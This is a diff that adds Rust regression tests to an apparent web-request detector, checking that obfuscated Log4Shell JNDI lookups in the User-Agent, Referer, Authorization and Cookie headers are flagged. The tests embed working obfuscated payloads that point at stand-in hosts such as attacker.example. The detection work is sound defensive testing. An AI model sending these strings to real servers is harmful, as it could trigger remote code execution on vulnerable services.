@@ -426,4 +426,121 @@ mod tests {
         let signals = d.inspect(&req);
         assert!(signals.iter().all(|s| s.score != 60));
     }
+
+    // ---- GAP-008b (Run-6, 2026-05-09) — header-borne obfuscation
+    // regression coverage. The QA Run-6 corpus reported these shapes
+    // as "missed" in headers; the patterns added in Run-5 should
+    // already cover them. Pin the exact payloads so any future
+    // refactor that breaks them is caught immediately.
+    fn log4shell_header_view(name: &'static str, val: &str) -> http::HeaderMap {
+        let mut h = http::HeaderMap::new();
+        h.insert(name, val.parse().unwrap());
+        h
+    }
+
+    #[test]
+    fn log4shell_ua_nested_obfuscation_blocks() {
+        // ${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view(
+            "user-agent",
+            "${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}",
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            d.inspect(&req).iter().any(|s| s.score == 60),
+            "nested ${{::-j}}-style obfuscation in UA must trip Log4Shell at score 60",
+        );
+    }
+
+    #[test]
+    fn log4shell_ua_lower_obfuscation_blocks() {
+        // ${${lower:j}ndi:ldap://x.com/a}
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view(
+            "user-agent",
+            "${${lower:j}ndi:ldap://x.com/a}",
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            d.inspect(&req).iter().any(|s| s.score == 60),
+            "lower:j case-fold obfuscation in UA must trip Log4Shell at score 60",
+        );
+    }
+
+    #[test]
+    fn log4shell_ua_upper_obfuscation_blocks() {
+        // ${${upper:j}ndi:ldap://x.com/a}
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view(
+            "user-agent",
+            "${${upper:j}ndi:ldap://x.com/a}",
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            d.inspect(&req).iter().any(|s| s.score == 60),
+            "upper:j case-fold obfuscation in UA must trip Log4Shell at score 60",
+        );
+    }
+
+    #[test]
+    fn log4shell_referer_nested_obfuscation_blocks() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view(
+            "referer",
+            "https://example.com/?x=${${::-j}${::-n}${::-d}${::-i}:dns://x.com/a}",
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            d.inspect(&req).iter().any(|s| s.score == 60),
+            "nested obfuscation in Referer must trip Log4Shell at score 60",
+        );
+    }
+
+    #[test]
+    fn log4shell_authorization_header_blocks() {
+        // Active-exploitation shape: bearer token slot abused for JNDI.
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view(
+            "authorization",
+            "Bearer ${${lower:j}ndi:ldap://attacker.example/x}",
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            d.inspect(&req).iter().any(|s| s.score == 60),
+            "obfuscated Log4Shell in Authorization must trip at score 60",
+        );
+    }
+
+    #[test]
+    fn log4shell_cookie_header_blocks() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view(
+            "cookie",
+            "session=${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}",
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            d.inspect(&req).iter().any(|s| s.score == 60),
+            "obfuscated Log4Shell in Cookie must trip at score 60",
+        );
+    }
 }
